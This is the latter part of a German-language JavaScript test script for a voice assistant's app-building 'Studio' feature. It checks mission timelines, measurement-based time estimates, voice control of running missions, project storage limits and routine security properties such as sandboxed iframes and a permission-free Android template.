        /* Zusammenfassen: simulierter Ablauf über echte Missions-Protokolleinträge */
        const w2 = welt(); const R2 = w2.c.jvStudioRegie; w2.ls.setItem('jv_regie_stufe', 'alle');
        const r = w2.c.jvMission.neu({ titel: 'Probe', auftrag: 'Auftrag', schritte: [{ titel: 'Eins' }, { titel: 'Zwei' }, { titel: 'Drei' }] });
        w2.c.jvStudioProjekte.arbeit.setze(r.mission.id, { studio: true });
        w2.c.jvMission.starten(r.mission.id);
        for (const sid of ['s1', 's2', 's3']) { w2.c.jvMission.schrittStarten(r.mission.id, sid); w2.c.jvMission.schrittErledigt(r.mission.id, sid, { art: 'test', text: 'Test ok ' + sid }); }
        const q = R2._queue();
        check('10t drei erledigte Schritte werden zu EINER Meldung zusammengefasst', q.filter(x => x.merge === 'schritte').length === 1 && /3 Schritte erledigt, zuletzt: Drei/.test(q.filter(x => x.merge === 'schritte')[0].text), q.map(x => x.text));
        check('10u Zeitleiste zeigt trotzdem jeden einzelnen echten Schritt', R2.zeitleiste(r.mission.id).filter(e => e.art === 'schritt_ende').length === 3);
        w2.c.jvMission.abschliessen(r.mission.id);
        check('10v Abschluss ist eine Ansage mit echter Dauer', R2._queue().some(x => /Die Mission „Probe“ ist abgeschlossen\. Dauer: /.test(x.text)), R2._queue().map(x => x.text));
        /* Ereignisse nur aus echten Daten */
        const w3 = welt(); const r3 = w3.c.jvMission.neu({ titel: 'Fremd', auftrag: 'A', schritte: [{ titel: 'X' }] });
        w3.c.jvMission.starten(r3.mission.id); w3.c.jvMission.schrittStarten(r3.mission.id, 's1');
        check('10w Missionen ohne Studio-Markierung erzeugen keine Ereignisse oder Ansagen', w3.c.jvStudioRegie.zeitleiste(r3.mission.id).length > 0 && w3.c.jvStudioRegie._queue().length === 0);
        check('10x die Zeitleiste einer fremden Mission besteht nur aus echten Protokolleinträgen', w3.c.jvStudioRegie.zeitleiste(r3.mission.id).every(e => /läuft|gestartet|angelegt|Mission/.test(e.text)), w3.c.jvStudioRegie.zeitleiste(r3.mission.id));
        /* Neustart: keine Wiederholung alter Ereignisse */
        const ls4 = speicher(); const w4 = welt({ ls: ls4 }); const r4 = w4.c.jvMission.neu({ titel: 'Alt', auftrag: 'A', schritte: [{ titel: 'X' }] }); w4.c.jvStudioProjekte.arbeit.setze(r4.mission.id, { studio: true }); w4.c.jvMission.starten(r4.mission.id);
        const w5 = welt({ ls: ls4 }); w5.c.jvStudioRegie._pumpe();
        check('10y nach einem Neustart werden alte Ereignisse nicht nachgespielt (keine Ansage-Flut)', w5.c.jvStudioRegie._queue().length === 0 && w5.gesprochen.length === 0);
    }

    /* ---------- 11 Zeitprognose nur aus Messwerten ---------- */
    {
        const w = welt(); const R = w.c.jvStudioRegie, K = w.c.jvMission;
        function missionMit(werkz, dauern) {
            const r = K.neu({ titel: 'Hist', auftrag: 'A', schritte: werkz.map(x => ({ titel: 'S ' + x, werkzeug: null })) });
            return r.mission.id;
        }
        const alt = K.neu({ titel: 'Neu', auftrag: 'A', schritte: [{ titel: 'Suchen', werkzeug: 'st_suche' }, { titel: 'Lesen', werkzeug: 'st_lesen' }] }).mission.id;
        K.starten(alt);
        const p0 = R.prognose(alt);
        check('11a ohne Messwerte: keine Prognose, mit Grund („0 von 3“)', p0.moeglich === false && /0 von 3/.test(p0.grund), p0);
        /* drei frühere Missionen mit gemessenen Dauern (echte Uhr, nicht erfunden) */
        function historie(dauerSuche, dauerLesen) {
            const id = K.neu({ titel: 'H', auftrag: 'A', schritte: [{ titel: 'Suchen', werkzeug: 'st_suche' }, { titel: 'Lesen', werkzeug: 'st_lesen' }] }).mission.id;
            K.starten(id); K.schrittStarten(id, 's1'); uhr.t += dauerSuche; K.schrittErledigt(id, 's1', { art: 'test', text: 'ok ok' });
            K.schrittStarten(id, 's2'); uhr.t += dauerLesen; K.schrittErledigt(id, 's2', { art: 'test', text: 'ok ok' }); K.abschliessen(id);
        }
        historie(10 * S, 30 * S); historie(14 * S, 40 * S);
        check('11b zwei Messwerte reichen nicht (Minimum 3)', R.prognose(alt).moeglich === false && /2 von 3/.test(R.prognose(alt).grund), R.prognose(alt));
        historie(12 * S, 50 * S);
        const p = R.prognose(alt);
        check('11c drei Messwerte: Prognose = Median (12 s + 40 s = 52 s), Spanne aus Quartilen, Grundlage genannt', p.moeglich === true && p.ms === 52 * S && p.vonMs <= p.ms && p.bisMs >= p.ms && /Mittelwert früherer Schritte|mindestens 3 Messungen/.test(p.basis), p);
        check('11d der Prognosesatz ist als Schätzung formuliert, ohne Prozent', /Nach früheren Messungen etwa/.test(p.satz) && !/%|Prozent/.test(p.satz), p.satz);
        K.schrittStarten(alt, 's1'); uhr.t += 5 * S;
        check('11e der laufende Schritt zählt nur seinen Rest (Median 12 s − 5 s verstrichen + 40 s = 47 s)', R.prognose(alt).ms === 47 * S, R.prognose(alt));
        const ohneWerkzeug = K.neu({ titel: 'Ohne', auftrag: 'A', schritte: [{ titel: 'Manuell' }] }).mission.id;
        check('11f Schritte ohne Werkzeug (nicht messbar) → keine Prognose', R.prognose(ohneWerkzeug).moeglich === false);
        check('11g Karte zeigt entweder die Schätzung samt Grundlage oder den Grund, nie eine Zahl ohne Grundlage', (() => { w.c.jvStudioProjekte.arbeit.setze(alt, { studio: true }); w.c.jvStudioAnsicht.zeige(alt); const h = w.c.jvStudioAnsicht.html(); return /Schätzung: Nach früheren Messungen/.test(h) && /Grundlage:/.test(h); })());
        w.elemente.actionCards = { parentNode: { insertBefore() { } } };
        check('11h Vollbild-Arbeitsmodus: während eine Mission läuft ist das Dashboard weg (Klasse gesetzt), danach wieder da', (() => { const A = w.c.jvStudioAnsicht, Mi = w.c.jvMission; const x = Mi.neu({ titel: 'Arbeitsmodus-Test', auftrag: 'A', schritte: [{ titel: 'a' }] }); const mid = x.mission.id; Mi.starten(mid); A.zeige(mid); const an = w.klassen.has('jvStudioArbeit') && A.arbeitModus(); Mi.abbrechen(mid, 'test'); A.zeige(mid); const aus = !w.klassen.has('jvStudioArbeit') && !A.arbeitModus(); return an && aus; })());
        check('11j Karte: streckt sich in der zentrierten Spalte (align-self:stretch), keine eigene Scroll-Box im Arbeitsmodus, Knöpfe unten fest (sticky)', /#studioKarte\{margin:8px 0;align-self:stretch;width:100%;min-width:0/.test(QUELLEN['js/studio_ansicht.js']) && !/max-height:calc/.test(QUELLEN['js/studio_ansicht.js']) && /\.skUnten\{position:sticky;bottom/.test(QUELLEN['js/studio_ansicht.js']));
        check('11i Arbeitsmodus blendet nur Übersicht/Raster/Uhr/Gruß aus, NICHT die Kugel (#uebKopf, #jarvisSphere) und nicht die Karte', (() => { const q = QUELLEN['js/studio_ansicht.js']; const css = /ARBEIT_CSS = ([\s\S]*?);\n/.exec(q)[1]; return /#uebRaster/.test(css) && /#overviewLine/.test(css) && !/uebKopf|jarvisSphere|reactor|recordBtn|studioKarte\{display/.test(css.split("html.jvStudioArbeit #uebKopf")[0]); })());
    }

    /* ---------- 12 Messung der Fish-Stimme (Geschwindigkeit und Zeichen) ---------- */
    {
        const w = welt(); const R = w.c.jvStudioRegie; R._reset();
        R.ansage('mm', 'Messsatz eins.', 3); R._pumpe();
        check('12a Ansage ist unterwegs', !!R._flug());
        uhr.t += 900; w.ctl.spricht = true; R._pumpe();
        uhr.t += 2500; w.ctl.spricht = false; R._pumpe();
        const ms = R.messung();
        check('12b Messung: 1 Ansage, Latenz 900 ms, Dauer 2500 ms, Zeichen/Bytes gezählt, KEIN Euro-Betrag', ms.anzahl === 1 && ms.gehoert === 1 && ms.latenzMedianMs === 900 && ms.dauerMedianMs === 2500 && ms.zeichen === 14 && ms.bytes === 14 && /nicht geschätzt/.test(ms.hinweis), ms);
        check('12c Messung überlebt den Neustart (localStorage)', JSON.parse(w.ls.getItem('jv_regie_messung')).length === 1);
    }

    /* ---------- 13 Sprachsteuerung der laufenden Mission ---------- */
    {
        const ls = speicher(); const w = welt(Object.assign(appPlan(), { ls })); laufPruefOk(w);
        const gate = { zu: true }; w.c.jvStudioWerkzeuge._laufPruefung = async () => { while (gate.zu) await pause(2); return { moeglich: true, geladen: true, fehler: [] }; };
        const { m } = await auftrag(w, 'Bau mir eine Zähler App');
        await pause(30);
        w.c.jvStudioAuftrag.behandle('Wie weit ist die Mission');
        check('13a Statusauskunft kommt aus echten Daten (Schritte, aktive Zeit), ohne Prozent', /Gerade läuft: /.test(w.gesprochen.slice(-1)[0]) && /von 4 Schritten sind erledigt/.test(w.gesprochen.slice(-1)[0]) && !/%|Prozent/.test(w.gesprochen.slice(-1)[0]) && /Zeitprognose kann ich noch nicht seriös geben/.test(w.gesprochen.slice(-1)[0]), w.gesprochen.slice(-1));
        w.c.jvStudioAuftrag.behandle('Pausiere die Mission');
        check('13b „Pausiere die Mission“ pausiert (echter Missions-Zustand)', w.c.jvMission.hole(m.id).status === 'pausiert');
        gate.zu = false; await pause(60);
        check('13c nach der Pause startet kein weiterer Schritt von selbst', w.c.jvMission.hole(m.id).status === 'pausiert' && w.c.jvMission.hole(m.id).schritte.filter(s => s.status === 'offen').length >= 1, w.c.jvMission.hole(m.id).schritte.map(s => s.status));
        w.c.jvStudioAuftrag.behandle('Setze die Mission fort'); await missionFertig(w, m.id);
        check('13d „Setze die Mission fort“ führt sie zu Ende, kein Schritt doppelt (Versuche je Schritt ≤ 2)', w.c.jvMission.hole(m.id).status === 'abgeschlossen' && w.c.jvMission.hole(m.id).schritte.every(s => s.versuche <= 2), w.c.jvMission.hole(m.id).schritte.map(s => s.status + ':' + s.versuche));
        const w2 = welt(appPlan()); laufPruefOk(w2);
        check('13e ohne laufende Mission: „Pausiere die Mission“ → ehrliche Antwort; „Wie weit bist du“ ohne Mission wird nicht abgefangen', (w2.c.jvStudioAuftrag.behandle('Pausiere die Mission'), /keine Mission/.test(w2.gesprochen[0])) && w2.c.jvStudioAuftrag.behandle('Wie weit bist du') === false);
        const w3 = welt(appPlan()); w3.c.jvStudioWerkzeuge._laufPruefung = async () => { await pause(80); return { moeglich: true, geladen: true, fehler: [] }; };
        const r3 = await auftrag(w3, 'Bau mir eine Zähler App'); await pause(20);
        w3.c.jvStudioAuftrag.behandle('Bau mir eine Webseite für meinen Verein');
        check('13f während eine Mission läuft, startet keine zweite (klare Ansage statt Parallelbetrieb)', w3.c.jvMission.liste().length === 1 && /läuft schon eine Mission/.test(w3.gesprochen.slice(-1)[0]), w3.gesprochen.slice(-1));
        w3.c.jvStudioAuftrag.behandle('Mission abbrechen');
        check('13g „Mission abbrechen“ bricht ab', w3.c.jvMission.hole(r3.m.id).status === 'abgebrochen');
        await pause(150);
        check('13h nach dem Abbruch speichert die Mission nichts mehr (kein Projekt)', w3.c.jvStudioProjekte.liste().length === 0, w3.c.jvStudioProjekte.liste().map(p => p.name));
        const w4 = welt(appPlan());
        w4.c.jvStudioAuftrag.behandle('Ansagen alle'); w4.c.jvStudioAuftrag.behandle('Mission stumm'); w4.c.jvStudioAuftrag.behandle('Energiesparen an');
        check('13i Einstellungen per Sprache wirken (Stufe, Stumm, Energiesparen)', w4.ls.getItem('jv_regie_stufe') === 'alle' && w4.ls.getItem('jv_regie_stumm') === '1' && w4.ls.getItem('jv_regie_spar') === '1');
        const w5 = welt(appPlan()); w5.c.jvStudioAuftrag.behandle('Ansagen aus'); laufPruefOk(w5);
        const r5 = await auftrag(w5, 'Bau mir eine Zähler App'); await missionFertig(w5, r5.m.id);
        check('13j mit „Ansagen aus“ spricht die Regie nicht (nur die direkten Antworten auf deine Befehle), die Mission läuft trotzdem', w5.c.jvMission.hole(r5.m.id).status === 'abgeschlossen' && w5.gesprochen.filter(t => /Wird erledigt|Mache ich|Bin dran|Verstanden|Sofort|Fertig|abgeschlossen/.test(t)).length === 0, w5.gesprochen);
    }

    /* ---------- 14 Projektgedächtnis: Grenzen und Beschädigung ---------- */
    {
        const w = welt(); const P = w.c.jvStudioProjekte;
        check('14a ungültige Projekte abgelehnt', !P.neu({ name: '', art: 'app' }).ok && !P.neu({ name: 'x', art: 'unbekannt' }).ok);
        for (let i = 0; i < 40; i++) P.neu({ name: 'P' + i, art: 'dokument', auftrag: 'a' });
        check('14b höchstens 40 Projekte, das 41. wird abgelehnt (nichts wird still gelöscht)', P.status().anzahl === 40 && P.neu({ name: 'Zuviel', art: 'dokument' }).voll === true);
        const w2 = welt(); w2.c.jvStudioProjekte.neu({ name: 'Groß', art: 'app', auftrag: 'a', dateien: [{ pfad: 'index.html', inhalt: 'x'.repeat(900000) }] });
        const g2 = w2.c.jvStudioProjekte.neu({ name: 'Noch groß', art: 'app', auftrag: 'a', dateien: [{ pfad: 'index.html', inhalt: 'x'.repeat(1000000) }] });
        check('14c Speichergrenze (1,8 MB): zu große Projekte werden abgelehnt, bestehende bleiben', g2.ok === false && g2.voll === true && w2.c.jvStudioProjekte.status().anzahl === 1);
        const u = w2.c.jvStudioProjekte.aktualisiere(w2.c.jvStudioProjekte.liste()[0].id, { dateien: [{ pfad: 'index.html', inhalt: 'y'.repeat(1700000) }] });
        check('14d zu große neue Fassung → abgelehnt, alte Fassung unverändert', u.ok === false && /x{10}/.test(w2.c.jvStudioProjekte.liste()[0].dateien[0].inhalt.slice(0, 10)) && w2.c.jvStudioProjekte.liste()[0].version === 1);
        const ls = speicher(); ls.setItem('jv_studio_projekte_v1', '{kaputt'); const w3 = welt({ ls });
        check('14e beschädigte Daten: leer starten, Original wird gesichert (nicht überschrieben)', w3.c.jvStudioProjekte.status().ladeStatus === 'defekt' && ls.getItem('jv_studio_projekte_v1_defekt') === '{kaputt');
        const w4 = welt(); const a = w4.c.jvStudioProjekte.neu({ name: 'Weg', art: 'dokument', auftrag: 'x' });
        check('14f entfernen funktioniert, Unbekanntes wird gemeldet', w4.c.jvStudioProjekte.entferne(a.projekt.id).ok && !w4.c.jvStudioProjekte.entferne('gibtsnicht').ok);
        const { c } = welt(); c.jvStudioProjekte.neu({ name: 'Alt', art: 'app', auftrag: 'x', dateien: APP_DATEIEN });
        const j1 = c.jvStudioProjekte.finde('die App von vorgestern'), j2 = c.jvStudioProjekte.finde('die letzte App');
        check('14g „vorgestern“ ohne Treffer → ehrliche Frage; „die letzte App“ → Treffer', j1.ok === false && j1.art === 'frage' && /Von diesem Tag habe ich nichts/.test(j1.frage) && j2.ok === true);
        check('14h der Zwischenstand einer Mission ist begrenzt (400 KB)', (() => { const w5 = welt(); return w5.c.jvStudioProjekte.arbeit.setze('x', { a: 'y'.repeat(300000) }) === true && w5.c.jvStudioProjekte.arbeit.setze('x2', { a: 'y'.repeat(300000) }) === false; })());
    }

    /* ---------- 15 Einbindung und Sicherheit im Code ---------- */
    {
        const idx = lies('index.html');
        const reihenfolge = ['mission_kern', 'studio_dateien', 'studio_projekte', 'studio_regie', 'studio_werkzeuge', 'studio_ansicht', 'studio_auftrag'].map(n => idx.indexOf('/js/' + n + '.js?v='));
        check('15a alle Studio-Skripte in index.html mit Stempel, in sinnvoller Reihenfolge', reihenfolge.every(p => p > 0) && reihenfolge.every((p, i) => i === 0 || p > reihenfolge[i - 1]), reihenfolge);
        const chef = lies('js/chef.js');
        check('15b Chef-KI-Haken: kiWeg und behandle fragen zuerst das Studio, unabhängig vom Chef-KI-Schalter', /function kiWeg\(text, mehr\) \{\n\s+try \{ if \(window\.jvStudioAuftrag/.test(chef) && /function behandle\(text\) \{\n\s+try \{ if \(window\.jvStudioAuftrag/.test(chef));
        const cw = welt({ dateien: [], vorher: c => { c.jvStudioAuftrag = { behandle: t => /bau mir/i.test(t) }; } }); vm.runInContext(chef, cw.c);
        check('15c verhalten: bei ausgeschalteter Chef-KI übernimmt das Studio einen Bau-Auftrag, sonst bleibt alles wie bisher', cw.c.jvChef.istAn() === false && cw.c.jvChef.kiWeg('Bau mir eine App') === true && cw.c.jvChef.kiWeg('Wie wird das Wetter') === false && cw.c.jvChef.behandle('Bau mir eine App') === true && cw.c.jvChef.behandle('Wie wird das Wetter') === false);
        const clientCode = ['js/studio_dateien.js', 'js/studio_projekte.js', 'js/studio_regie.js', 'js/studio_werkzeuge.js', 'js/studio_ansicht.js', 'js/studio_auftrag.js'].map(f => QUELLEN[f].replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/[^\n]*/g, ''));
        check('15d kein direktes fetch/XMLHttpRequest/WebSocket/eval im Studio-Browsercode (nur apiFetch)', clientCode.every(c => !/\bfetch\s*\(|new XMLHttpRequest|new WebSocket|\beval\s*\(|new Function\s*\(/.test(c)), clientCode.map(c => /\bfetch\s*\(|new XMLHttpRequest|new WebSocket|\beval\s*\(|new Function\s*\(/.exec(c)));
        check('15e erzeugter Code läuft nur in iframes mit sandbox (ohne allow-same-origin): Testlauf und Vorschau', (QUELLEN['js/studio_werkzeuge.js'].match(/setAttribute\('sandbox', '([^']*)'\)/) || [])[1] === 'allow-scripts' && /sandbox', 'allow-scripts allow-forms allow-modals'/.test(QUELLEN['js/studio_ansicht.js']));
        check('15f der Testlauf reicht dem erzeugten Code keine App-Daten: Meldungen nur mit Zufallskennung, Quelle muss das eigene iframe sein', /ev\.source !== fr\.contentWindow/.test(QUELLEN['js/studio_werkzeuge.js']) && /jvStudio !== tok/.test(QUELLEN['js/studio_werkzeuge.js']));
        check('15g keine neue API-Datei (11 Functions), kein APK-Quellcode (weckruf-src) geändert', fs.readdirSync(path.join(ROOT, 'api')).filter(f => /\.js$/.test(f)).length === 11 && !/weckruf-src/.test(cp.spawnSync('git', ['diff', '--name-only', 'origin/main'], { cwd: ROOT, encoding: 'utf8' }).stdout));
        const sph = lies('js/sphere.js');
        check('15h Kugel: nur Farbzustand und kurzer Ring bei echtem Ereignis, KEINE zusätzliche Animationsschleife', /window\.jvSphereArbeit === true\) return 'thinking'/.test(sph) && /window\.jvSphereImpuls/.test(sph) && (sph.match(/requestAnimationFrame/g) || []).length === (cp.spawnSync('git', ['show', 'origin/main:js/sphere.js'], { cwd: ROOT, encoding: 'utf8' }).stdout.match(/requestAnimationFrame/g) || []).length);
        const tmpl = lies('studio-build/android/app/src/main/AndroidManifest.xml'), wf = lies('.github/workflows/studio-apk.yml'), java = lies('studio-build/android/app/src/main/java/de/dino/studio/MainActivity.java');
        check('15i Android-Vorlage ohne jede Berechtigung (auch ohne INTERNET), WebView ohne Dateizugriff und ohne Netz', !/uses-permission/.test(tmpl.replace(/<!--[\s\S]*?-->/g, '')) && /setBlockNetworkLoads\(true\)/.test(java) && /setAllowFileAccess\(false\)/.test(java) && /setAllowUniversalAccessFromFileURLs\(false\)/.test(java) && !/addJavascriptInterface/.test(java));
        check('15j Bau-Workflow: nur Branches studio/**, Projekt wird nur kopiert (nie ausgeführt), Dateityp- und Größenprüfung, keine ${{ }}-Einsetzung von Projektdaten', /branches:\s*\n\s+- 'studio\/\*\*'/.test(wf) && /ok_endung/.test(wf) && /1200000/.test(wf) && !/\$\{\{\s*(github\.head_ref|github\.event|inputs)/.test(wf.replace(/\$\{\{ github\.token \}\}|\$\{\{ github\.repository \}\}/g, '')));
        check('15k Workflow ändert den bestehenden Weckruf-Bau nicht (eigene Datei, eigener Ordner)', !/weckruf/.test(wf));
        const hilfe = lies('js/help.js'), tour = lies('js/anleitung.js');
        check('15l Hilfe und Tour kennen die neue Funktion', /key: 'studio'/.test(hilfe) && /h: "studio"/.test(tour) && /App von gestern/.test(hilfe));
    }

    console.log('STUDIO: ' + ok + ' Prüfungen in Ordnung, ' + fehler + ' Fehler');
    process.exit(fehler ? 1 : 0);
})().catch(e => { console.log('✗ Test abgestürzt: ' + (e && e.stack || e)); process.exit(1); });
